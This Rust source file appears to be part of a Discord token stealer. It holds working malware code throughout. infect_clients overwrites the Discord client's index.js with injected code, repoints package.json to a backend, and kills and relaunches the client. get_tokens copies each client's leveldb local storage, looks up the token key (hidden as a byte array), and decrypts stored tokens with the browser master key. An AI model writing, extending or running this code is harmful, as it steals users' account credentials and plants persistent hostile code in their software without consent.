#[path = "constants.rs"]
mod constants;
#[path = "crypto.rs"]
mod crypto;
use leveldb::database::Database;
use leveldb::options::{Options, ReadOptions};
use serde_json::Value;
use std::{env, fs};
use std::{
    path::{Path, PathBuf},
    process::Command,
};
use sysinfo::{ProcessExt, SystemExt};
use uuid::Uuid;
use walkdir::WalkDir;

fn infect_client(
    client_dir: &PathBuf,
    client_executable: &'static str,
    shortcut_name: &'static str,
) -> Result<(), Box<dyn std::error::Error>> {
    for entry in WalkDir::new(client_dir).follow_links(true) {
        let entry = entry?;
        let path = entry.path();

        if path.is_dir() {
            if path.to_string_lossy().ends_with("discord_desktop_core") {
                fs::write(path.join("index.js"), constants::INJECT_CODE)?;

                let options_path = path.join("package.json");

                let contents = fs::read_to_string(&options_path)?;

                let mut json: Value = serde_json::from_str(&contents)?;
                json["backend"] = Value::String(constants::BACKEND.to_string());
                json["first_time"] = Value::Bool(false);
                fs::write(&options_path, json.to_string())?;
            }
        }
    }

    if constants::REFRESH_DISCORD {
        let mut system = sysinfo::System::new();
        system.refresh_all();

        let roaming = env::var("APPDATA")?;
        let roaming_path = Path::new(roaming.as_str());

        if system.processes_by_name(client_executable).count() > 0 {
            for process in system.processes_by_name(client_executable) {
                process.kill();
            }

            let shortcut_dir =
                roaming_path.join("Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc");
            let shortcut_path = shortcut_dir.join(shortcut_name);

            if shortcut_path.exists() {
                Command::new("cmd")
                    .arg(format!(
                        "/C start explorer {}",
                        shortcut_path.to_string_lossy()
                    ))
                    .spawn()?;
            }
        }
    }
    Ok(())
}

pub fn infect_clients() -> Result<(), Box<dyn std::error::Error>> {
    let userprofile = env::var("USERPROFILE")?;
    let appdata_dir = Path::new(userprofile.as_str()).join("AppData");

    for (path, client_executable, shortcut_name) in constants::CLIENT_TARGETS.iter() {
        let client_dir = appdata_dir.join(path);

        if client_dir.exists() {
            infect_client(&client_dir, client_executable, shortcut_name)?;
        }
    }
    Ok(())
}

fn copy_directory(in_dir: &PathBuf, out_dir: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    for entry in WalkDir::new(&in_dir) {
        let entry = entry?;

        let from = entry.path();
        let to = out_dir.join(from.strip_prefix(&in_dir)?);

        if entry.file_type().is_dir() {
            fs::create_dir(to)?;
        } else if entry.file_type().is_file() {
            fs::copy(from, to)?;
        }
    }
    Ok(())
}

fn decrypt_token(cipher_text: &str, local_state_path: &PathBuf) -> Option<String> {
    if let Some(master_key) = crypto::get_master_key(&local_state_path) {
        let plain_text = crypto::aes_decrypt(base64::decode(cipher_text).ok()?, &master_key);
        return Some(String::from_utf8(plain_text).ok()?);
    }
    return None;
}

pub fn get_tokens() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let userprofile = env::var("USERPROFILE")?;
    let appdata_dir = Path::new(userprofile.as_str()).join("AppData");
    let temp_env = std::env::temp_dir();

    let mut tokens = Vec::new();

    for token_target in constants::TOKEN_TARGETS {
        let token_dir = appdata_dir.join(token_target);

        if token_dir.exists() {
            let leveldb_dir = token_dir.join("Local Storage").join("leveldb");

            if leveldb_dir.exists() {
                let temp_dir = temp_env.join(Uuid::new_v4().to_string());
                copy_directory(&leveldb_dir, &temp_dir)?;

                let options = Options::new();
                let database = Database::open(&temp_dir, &options)?;

                let read_opts = ReadOptions::new();

                // _https://discord.com☺tokens
                let key = [
                    95, 104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46,
                    99, 111, 109, 0, 1, 116, 111, 107, 101, 110, 115,
                ];

                if let Some(bytes) = database.get_u8(&read_opts, &key)? {
                    let json: Value = serde_json::from_slice(&bytes[1..])?;

                    if let Some(obj) = json.as_object() {
                        for value in obj.values() {
                            if let Some(token) = value.as_str() {
                                if token.starts_with("dQw4w9WgXcQ:") {
                                    let local_state_path = token_dir.join("Local State");

                                    if let Some(plain_text) =
                                        decrypt_token(&token[12..], &local_state_path)
                                    {
                                        tokens.push(plain_text);
                                    }
                                } else {
                                    tokens.push(token.to_string());
                                }
                            }
                        }
                    }
                }

                drop(database);
                fs::remove_dir_all(temp_dir)?;
            }
        }
    }
    Ok(tokens)
}
